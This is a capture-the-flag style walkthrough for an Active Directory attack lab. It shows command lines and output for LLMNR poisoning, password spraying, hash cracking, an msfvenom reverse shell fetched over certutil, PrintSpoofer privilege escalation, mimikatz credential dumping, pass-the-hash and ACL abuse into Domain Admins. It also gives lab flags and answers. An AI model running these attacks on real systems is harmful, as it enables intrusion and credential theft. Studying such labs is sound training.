# AD Enumeration & Attacks - Skills Assessment Part II
## Scenario
Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

## Questions
SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? **Answer: AB920**
   - Setup responder and wait for LLMNR, NBT-NS, and MDNS broadcast requests → read the NTLMv2-SSP Username:
     ```
     $ sudo responder -I ens224 -wrfv
     [+] Listening for events...

     [*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
     [!]  Fingerprint failed
     [*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
     [*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
     [!]  Fingerprint failed
     [*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
     [SMB] NTLMv2-SSP Client   : 172.16.7.3
     [SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
     [SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:50bf479bb8f547ec:7542EFDB571548C87F59DA00C3922C96:01010000000000008039478881D0DC01B73975703B2B7B5B0000000002000800390049005900520001001E00570049004E002D0049004500490037005A0033003000530053005600560004003400570049004E002D0049004500490037005A003300300053005300560056002E0039004900590052002E004C004F00430041004C000300140039004900590052002E004C004F00430041004C000500140039004900590052002E004C004F00430041004C00070008008039478881D0DC0106000400020000000800300030000000000000000000000000200000FDD98079412048A24FF4CB3D5B641627B9639572946BABBF2E1ABAEB498D0CCC0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
     ```
2. What is this user's cleartext password? **Answer: weasal**
   - Copy the hash and crack it offline:
     ```sh
     $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
     <SNIP>
     AB920::INLANEFREIGHT:50bf479bb8f547ec:7542efdb571548c87f59da00c3922c96:01010000000000008039478881d0dc01b73975703b2b7b5b0000000002000800390049005900520001001e00570049004e002d0049004500490037005a0033003000530053005600560004003400570049004e002d0049004500490037005a003300300053005300560056002e0039004900590052002e004c004f00430041004c000300140039004900590052002e004c004f00430041004c000500140039004900590052002e004c004f00430041004c00070008008039478881d0dc0106000400020000000800300030000000000000000000000000200000fdd98079412048a24ff4cb3d5b641627b9639572946babbf2e1abaeb498d0ccc0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
     <SNIP>
     ```
3. Submit the contents of the C:\flag.txt file on MS01. **Answer: aud1t_gr0up_m3mbersh1ps!**
   - Enumerating the AD network:
     ```sh
     $fping -asgq 172.16.7.0/23
     172.16.7.3
     172.16.7.50
     172.16.7.60
     172.16.7.240

          510 targets
          4 alive
          506 unreachable
          0 unknown addresses

     2024 timeouts (waiting for response)
     2028 ICMP Echos sent
          4 ICMP Echo Replies received
     2024 other ICMP received

     0.084 ms (min round trip time)
     1.54 ms (avg round trip time)
     2.90 ms (max round trip time)
          14.302 sec (elapsed real time)
     ```
   - Copy those IP addresses to `hosts` and perform nmap scan to identify each host → MS01 is at `172.16.7.50`:
     ```sh
     $nmap -A -iL hosts -oN host-enum
     Starting Nmap 7.92 ( https://nmap.org ) at 2026-04-20 05:45 EDT
     Nmap scan report for inlanefreight.local (172.16.7.3)
     Host is up (0.066s latency).
     Not shown: 989 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     53/tcp   open  domain        Simple DNS Plus
     88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 09:45:04Z)
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
     445/tcp  open  microsoft-ds?
     464/tcp  open  kpasswd5?
     593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
     636/tcp  open  tcpwrapped
     3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
     3269/tcp open  tcpwrapped
     Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: -1m05s
     | smb2-time: 
     |   date: 2026-04-20T09:45:10
     |_  start_date: N/A
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled and required
     |_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:72:d1 (VMware)

     Nmap scan report for 172.16.7.50
     Host is up (0.070s latency).
     Not shown: 996 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     445/tcp  open  microsoft-ds?
     3389/tcp open  ms-wbt-server Microsoft Terminal Services
     |_ssl-date: 2026-04-20T09:45:49+00:00; -33s from scanner time.
     | ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
     | Not valid before: 2026-04-19T09:29:17
     |_Not valid after:  2026-10-19T09:29:17
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:94:08 (VMware)
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled but not required
     |_clock-skew: mean: -33s, deviation: 0s, median: -34s
     | smb2-time: 
     |   date: 2026-04-20T09:45:41
     |_  start_date: N/A

     Nmap scan report for 172.16.7.60
     Host is up (0.070s latency).
     Not shown: 996 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     445/tcp  open  microsoft-ds?
     1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
     | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
     | Not valid before: 2026-04-20T09:31:57
     |_Not valid after:  2056-04-20T09:31:57
     |_ssl-date: 2026-04-20T09:45:18+00:00; -1m05s from scanner time.
     | ms-sql-ntlm-info: 
     |   Target_Name: INLANEFREIGHT
     |   NetBIOS_Domain_Name: INLANEFREIGHT
     |   NetBIOS_Computer_Name: SQL01
     |   DNS_Domain_Name: INLANEFREIGHT.LOCAL
     |   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
     |   DNS_Tree_Name: INLANEFREIGHT.LOCAL
     |_  Product_Version: 10.0.17763
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: mean: -1m05s, deviation: 0s, median: -1m05s
     |_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:df:be (VMware)
     | ms-sql-info: 
     |   Windows server name: SQL01
     |   172.16.7.60\SQLEXPRESS: 
     |     Instance name: SQLEXPRESS
     |     Version: 
     |       name: Microsoft SQL Server 2019 RTM
     |       number: 15.00.2000.00
     |       Product: Microsoft SQL Server 2019
     |       Service pack level: RTM
     |       Post-SP patches applied: false
     |     TCP port: 1433
     |_    Clustered: false
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled but not required
     | smb2-time: 
     |   date: 2026-04-20T09:45:10
     |_  start_date: N/A

     Nmap scan report for 172.16.7.240
     Host is up (0.069s latency).
     Not shown: 998 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
     | ssh-hostkey: 
     |   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
     |   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
     |_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
     3389/tcp open  ms-wbt-server xrdp
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Post-scan script results:
     | clock-skew: 
     |   -1m05s: 
     |     172.16.7.60
     |_    172.16.7.3 (inlanefreight.local)
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 4 IP addresses (4 hosts up) scanned in 37.65 seconds
     ```
   - Table of active hosts in AD network:
     |IP|HOSTNAME|OS|OPEN PORTS|
     |-|-|-|-|
     |172.16.7.3|`DC01`|Windows|53, 88, 139, 135, 389, 445, 464, 593, 636, 3268, 3269|
     |172.16.7.50|`MS01`|Windows|135, 139, 445, 3389|
     |172.16.7.60|`SQL01`|Windows|135, 139, 445, 1433|
   - Enable dynamic port forwarding with ssh and RDP to the target to read the flag:
     ```sh
     $ ssh htb-student@10.129.71.191 -D 9050
     $ proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal
     ```
4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. **Answer: BR086**
   - Enumerate domain users and create a list of them for later password spraying attack:
     ```sh
     $sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
     $cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
     ```
   - Perform password spraying with password `Welcome1`:
     ```sh
     $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1

     __             __               __     
     / /_____  _____/ /_  _______  __/ /____ 
     / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
     / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
     /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

     Version: dev (9cfb81e) - 04/20/26 - Ronnie Flathers @ropnop

     2026/04/20 06:58:45 >  Using KDC(s):
     2026/04/20 06:58:45 >  	172.16.7.3:88

     2026/04/20 06:59:02 >  [+] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
     2026/04/20 06:59:02 >  Done! Tested 2904 logins (1 successes) in 17.010 seconds
     ```
5. What is this user's password? **Answer: Welcome1**
   - Above password spraying attack
6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? **Answer: D@ta_bAse_adm1n!**
   - Perform SMB enumeration, identify these shares:
    ```sh
    $smbmap -u br086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3
    [+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      ADMIN$                                            	NO ACCESS	Remote Admin
      C$                                                	NO ACCESS	Default share
      Department Shares                                 	READ ONLY	Share for department users
      IPC$                                              	READ ONLY	Remote IPC
      NETLOGON                                          	READ ONLY	Logon server share 
      SYSVOL                                            	READ ONLY	Logon server share
    ```
   - Try access the Department Shares and found `web.config`:
    ```
    $smbclient -U br086 //172.16.7.3/'Department Shares'
    Enter WORKGROUP\br086's password: 
    Try "help" to get a list of possible commands.           
    smb: \> ls
      .                                   D        0  Fri Apr  1 11:04:01 2022
      ..                                  D        0  Fri Apr  1 11:04:01 2022
      Accounting                          D        0  Fri Apr  1 11:04:03 2022
      Executives                          D        0  Fri Apr  1 11:03:58 2022
      Finance                             D        0  Fri Apr  1 11:03:54 2022
      HR                                  D        0  Fri Apr  1 11:03:43 2022
      IT                                  D        0  Fri Apr  1 11:03:39 2022
      Marketing                           D        0  Fri Apr  1 11:03:50 2022
      R&D                                 D        0  Fri Apr  1 11:03:46 2022

        10328063 blocks of size 4096. 8142430 blocks available
    smb: \> cd IT
    smb: \IT\> ls
      .                                   D        0  Fri Apr  1 11:03:39 2022
      ..                                  D        0  Fri Apr  1 11:03:39 2022
      Private                             D        0  Fri Apr  1 11:03:39 2022
      Public                              D        0  Fri Apr  1 11:03:37 2022

        10328063 blocks of size 4096. 8142430 blocks available
    smb: \IT\> cd Private
    smb: \IT\Private\> ls
      .                                   D        0  Fri Apr  1 11:03:39 2022
      ..                                  D        0  Fri Apr  1 11:03:39 2022
      Development                         D        0  Fri Apr  1 11:04:07 2022

        10328063 blocks of size 4096. 8142430 blocks available
    smb: \IT\Private\> cd Development
    smb: \IT\Private\Development\> ls
      .                                   D        0  Fri Apr  1 11:04:07 2022
      ..                                  D        0  Fri Apr  1 11:04:07 2022
      web.config                          A     1203  Fri Apr  1 11:04:05 2022

        10328063 blocks of size 4096. 8142430 blocks available
    ```
   - Download `web.config` locally and read the MSSQL connection string:
    ```sh
    smb: \IT\Private\Development\> get web.config
    getting file \IT\Private\Development\web.config of size 1203 as web.config (235.0 KiloBytes/sec) (average 235.0 KiloBytes/sec)
    smb: \IT\Private\Development\> exit
    $cat web.config
    <?xml version="1.0" encoding="utf-8"?>

    <configuration> 
        <system.web>
          <membership>
              <providers>
                  <add name="WebAdminMembershipProvider" type="System.Web.Administration.WebAdminMembershipProvider" />
              </providers>
          </membership>
          <httpModules>
                  <add name="WebAdminModule" type="System.Web.Administration.WebAdminModule"/>
            </httpModules>
            <authentication mode="Windows"/>
            <authorization>
                  <allow users="netdb"/>
            </authorization>
            <identity impersonate="true"/>
          <trust level="Full"/>
          <pages validateRequest="true"/>
          <globalization uiCulture="auto:en-US" />
        <masterDataServices>  
                <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
          </masterDataServices>  
          <connectionStrings>
              <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
          </connectionStrings>
      </system.web>
    </configuration>
    ```
7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. **Answer:**
   - Access the MSSQL database with the harvested credentials `netdb`:`D@ta_bAse_adm1n!` (currently we do not have the permission to read the Administrator's Desktop) and check for current permissions → `SeImpersonatePrivilege` enabled:
    ```
    $mssqlclient.py netdb:'D@ta_bAse_adm1n!'@172.16.7.60
    SQL> EXEC xp_cmdshell 'whoami /priv'
    output                                                                                                                                               

    PRIVILEGES INFORMATION                                                                                                                                                                                                                                            

    ----------------------                                                                                                                                                                                                                                            

    NULL                                                                                                                                                                                                                                                              

    Privilege Name                Description                               State                                                                                                                                                                                     

    ============================= ========================================= ========                                                                                                                                                                                  

    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                                                                                                  

    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                                                                                                  

    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                                                   

    SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                                                   

    SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                                                   

    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                     
    ```
   - Now to perform privilege escalation on SQL01, we need the Printspoofer tool and a reverse shell payload, download the tool and generate the payload, then open a python http server to host the files:
    ```sh
    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1411 -f exe -o shell.exe
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 510 bytes
    Final size of exe file: 7168 bytes
    Saved as: shell.exe
    $ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
    $ scp PrintSpoofer64.exe htb-student@10.129.71.191:/home/htb-student/Downloads       
    $ scp shell.exe  htb-student@10.129.71.191:/home/htb-student/Downloads  
    $ ssh htb-student@10.129.71.191
    htb-student@10.129.71.191's password: 
    HTB_@cademy_stdnt!Permission denied, please try again.
    htb-student@10.129.71.191's password: 
    Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
    ____                      _     ____            
    |  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
    | |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
    |  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
    |_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                    
    $cd Downloads/
    $python -m http.server 9999
    ```
   - Setup a listener on the Parrot Linux VM to catch the reverse shell:
    ```sh
    $sudo msfconsole -q
    [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.7.240
    LHOST => 172.16.7.240
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1411
    LPORT => 1411
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
    ```
   - On the SQL connection, download the Printspoofer and reverse shell payload, then execute the PE script with the reverse shell payload to gain administrator rights:
    ```
    SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:9999/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"
    output                                                                             

    --------------------------------------------------------------------------------   

    ****  Online  ****                                                                 

    CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)   

    CertUtil: Not found (404).                                                         

    NULL                                                                               

    SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:9999/PrintSpoofer64.exe C:\Users\Public\PrintSpoofer.exe"
    output                                                                             

    --------------------------------------------------------------------------------   

    ****  Online  ****                                                                 

    CertUtil: -URLCache command completed successfully.                                

    NULL                                                                               

    SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:9999/shell.exe C:\Users\Public\shell.exe"
    output                                                                             

    --------------------------------------------------------------------------------   

    ****  Online  ****                                                                 

    CertUtil: -URLCache command completed successfully.
    SQL> xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c C:\Users\Public\shell.exe
    output                                                                             

    --------------------------------------------------------------------------------   

    [+] Found privilege: SeImpersonatePrivilege                                        

    [+] Named pipe listening...                                                        

    [+] CreateProcessAsUser() OK
    ```
   - Now we have a valid admin shell, let's read the flag:
    ```
    [*] Started reverse TCP handler on 172.16.7.240:1411 
    [*] Sending stage (200262 bytes) to 172.16.7.60
    [*] Meterpreter session 1 opened (172.16.7.240:1411 -> 172.16.7.60:49727 ) at 2026-04-21 03:27:26 -0400

    (Meterpreter 1)(C:\Windows\system32) > shell
    Process 1280 created.
    Channel 1 created.
    Microsoft Windows [Version 10.0.17763.2628]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>cd ../../Users/Administrator/Desktop
    C:\Users\Administrator\Desktop>dir
    Volume in drive C has no label.
    Volume Serial Number is B8B3-0D72

    Directory of C:\Users\Administrator\Desktop

    04/11/2022  10:32 PM    <DIR>          .
    04/11/2022  10:32 PM    <DIR>          ..
    04/11/2022  10:33 PM                21 flag.txt
                  1 File(s)             21 bytes
                  2 Dir(s)  17,232,691,200 bytes free

    C:\Users\Administrator\Desktop>type flag.txt
    s3imp3rs0nate_cl@ssic
    ```
8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. **Answer: exc3ss1ve_adm1n_r1ights!**
   - From the established meterpreter shell, load `kiwi` and dump all credentials with `creds_all`:
    ```
    (Meterpreter 1)(C:\Users\Public) > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x64/windows)
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

    Success.
    (Meterpreter 1)(C:\Users\Public) > creds_all
    [+] Running as SYSTEM
    [*] Retrieving all credentials
    msv credentials
    ===============

    Username  Domain         NTLM                              SHA1                                      DPAPI
    --------  ------         ----                              ----                                      -----
    SQL01$    INLANEFREIGHT  4b573a7c7e89c580f3b76b3966b413fd  dd328234d0f96ba5e31c7b3227e9a3534e1f14b8
    SQL01$    INLANEFREIGHT  6991907663e3f68922d24ac9a573e2c3  33058b24d5882f1dd18ce81988aa64226e2879b5
    mssqlsvc  INLANEFREIGHT  8c9555327d95f815987c0d81238c7660  0a8d7e8141b816c8b20b4762da5b4ee7038b515c  a1568414db09f65c238b7557bc3ceeb8
    ```
   - Since `xfreerdp` got blocked, try `evil-winrm` to access MS01 and read the flag:
    ```sh
    $ proxychains evil-winrm -i 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
                                            
    Evil-WinRM shell v3.5
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.7.50:5985  ...  OK
    *Evil-WinRM* PS C:\Users\mssqlsvc\Documents> hostname
    MS01
    *Evil-WinRM* PS C:\Users\mssqlsvc\Documents> cd ../../Administrator/Desktop
    *Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
    exc3ss1ve_adm1n_r1ights!
    ```
9.  Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name? **Answer: CT059**
   - From the meterpreter session use `lsa_dump_secrets` module to obtain cleartext credential of `mssqlsvc`:
      ```sh
      (Meterpreter 4)(C:\Windows\system32) > lsa_dump_secrets
      [+] Running as SYSTEM
      [*] Dumping LSA secrets
      Domain : SQL01
      SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6

      Local name : SQL01 ( S-1-5-21-3827174835-953655006-33323432 )
      Domain name : INLANEFREIGHT ( S-1-5-21-3327542485-274640656-2609762496 )
      Domain FQDN : INLANEFREIGHT.LOCAL

      Policy subsystem is : 1.18
      LSA Key(s) : 1, default {271ef2d8-a7e6-cb85-8c70-fbdc47141c2e}
        [00] {271ef2d8-a7e6-cb85-8c70-fbdc47141c2e} bd86a206ac6981922ddbab4e0b2d37517dd963ace517b5203892f6ad94beea7f

      Secret  : $MACHINE.ACC
      cur/hex : 1a dc 98 73 f8 c9 ae 62 98 c7 3d f0 ce c5 98 76 d0 be de b8 8a bd b2 e7 27 ea 41 11 80 ca 8a 1b 04 8a f6 4c 4a 53 69 f0 04 84 c1 da f2 25 ef 57 51 17 03 8b 2e ac cc 66 9b ce 7b 1a 1b 06 86 6f c1 9f b0 57 26 0d a2 12 07 dd 5a d3 86 2f 73 99 17 7b d6 c4 47 a9 08 67 2b a5 25 f8 47 ca ae cf a5 45 44 98 46 93 85 8c 25 58 71 f7 2d 06 bb e0 6a cd e5 dc 1c 0e ae 83 d4 2b 87 9a 35 47 98 cb fc fe 29 55 f5 b2 f5 46 5c 5b 64 ed 03 90 8f 88 ba 7c d8 76 d7 72 f3 51 37 83 eb 11 f7 2d 84 b7 98 b4 00 90 bd de 83 85 82 fb 9b 1b d6 b9 ad c8 e5 a8 dc ea 57 4f a9 9b 7a 2c 49 0b 8d 3e a7 f5 51 02 1b b1 f2 f3 3a 51 09 fa 64 85 59 b9 fa 0d 70 18 b5 2e 5f f0 18 d7 6c 60 66 19 fe c2 dd 92 17 5c dc e1 ac e0 f6 17 88 b2 39 cb a1 8c bd 77 
          NTLM:cf87816db6bc4b1c8f8484508b55bba1
          SHA1:c88c1a0a87b7d10957c427893dbe92eadaa57ad0
      old/text: ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkT%c3)R+c&xcu_:]n#V1V.j[=+GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
          NTLM:6991907663e3f68922d24ac9a573e2c3
          SHA1:33058b24d5882f1dd18ce81988aa64226e2879b5

      Secret  : DefaultPassword
      old/text: Sup3rS3cur3maY5ql$3rverE
      ```
   - RDP to the MS01 machine using the `mssqlsvc`:`Sup3rS3cur3maY5ql$3rverE` credential with PowerView.ps1 already installed in `/home/htb-ac-1863259/Downloads`:
      ```sh
      $ proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /drive:share,/home/htb-ac-1863259/Downloads
      ```
   - In the remote session, import the module and get the Sid of the user with GenericAll right:
      ```pwsh
      PS C:/>Import-Module ./PowerView.ps1
      PS C:/>Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights -match "GenericAll") -and ($_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-21-.*-512$")} | Select-Object SecurityIdentifier, ActiveDirectoryRights

      SecurityIdentifier                            ActiveDirectoryRights
      ------------------                            ---------------------
      S-1-5-21-3327542485-274640656-2609762496-4611            GenericAll
      ```
      > Note: For files in the shared drive, we need to copy it to another place to correctly use it
   - Convert this Sid to name to read the user's account name:
      ```pwsh
      PS C:/>Convert-SidtoName "S-1-5-21-3327542485-274640656-2609762496-4611"
      INLANEFREIGHT\CT059
      ```
10. Crack this user's password hash and submit the cleartext password as your answer. **Answer: charlie1**
   - Leverage Inveigh (running in elevated session) for LLMNR & NTB-NS poisoning and capture CT059's NTLM hash:
      ```pwsh
      PS C:\Users\Public> Import-Module .\Inveigh.ps1
      PS C:\Users\Public> Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y ConsoleOutput Y -FileOutput Y
      [*] Inveigh 1.506 started at 2026-04-22T04:16:33
      [+] Elevated Privilege Mode = Enabled
      [+] Primary IP Address = 172.16.7.50
      [+] Spoofer IP Address = 172.16.7.50
      [+] ADIDNS Spoofer = Disabled
      [+] DNS Spoofer = Enabled
      [+] DNS TTL = 30 Seconds
      [+] LLMNR Spoofer = Enabled
      [+] LLMNR TTL = 30 Seconds
      [+] mDNS Spoofer = Disabled
      [+] NBNS Spoofer For Types 00,20 = Enabled
      [+] NBNS TTL = 165 Seconds
      [+] SMB Capture = Enabled
      [+] HTTP Capture = Enabled
      [+] HTTPS Certificate Issuer = Inveigh
      [+] HTTPS Certificate CN = localhost
      [+] HTTPS Capture = Enabled
      [+] HTTP/HTTPS Authentication = NTLM
      [+] WPAD Authentication = NTLM
      [+] WPAD NTLM Authentication Ignore List = Firefox
      [+] WPAD Response = Enabled
      [+] Kerberos TGT Capture = Disabled
      [+] Machine Account Capture = Disabled
      [+] Console Output = Disabled
      [+] File Output = Enabled
      [+] Output Directory = C:\Users\Public
      WARNING: [!] Run Stop-Inveigh to stop
      PS C:\Users\Public> more Inveigh-NTLMv2.txt
      CT059::INLANEFREIGHT:34FB9516B1FBB278:5EB42E6CE2AEE750F3630B2EE440BC56:01010000000000008D46102439D2DC017CC2C59EEAB05B660000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008008D46102439D2DC0106000400020000000800300030000000000000000000000000200000BB2F4B69898E8D29495C2EAA8894C51B5307BD55C3CC1AAB9AEF0B3295ED50DB0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
      ```
   -  Copy the NTLM hash and crack it offline:
      ```sh
      $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
      <SNIP>

      CT059::INLANEFREIGHT:34fb9516b1fbb278:5eb42e6ce2aee750f3630b2ee440bc56:01010000000000008d46102439d2dc017cc2c59eeab05b660000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008008d46102439d2dc0106000400020000000800300030000000000000000000000000200000bb2f4b69898e8d29495c2eaa8894c51b5307bd55c3cc1aab9aef0b3295ed50db0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1

      <SNIP>
      ```
11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. **Answer: acLs_f0r_th3_w1n!**
   - Since we have `GenericAll` right we can proceed to add ourself to the `Domain Admins` group:
      ```pwsh
      PS C:\Users\Public> runas /netonly /user:INLANEFREIGHT\CT059 powershell
      PS C:\Users\Public> Import-Module ./PowerView.ps1
      PS C:\Users\Public> Add-DomainGroupMember -Identity "Domain Admins" -Members "INLANEFREIGHT\CT059"
      ```
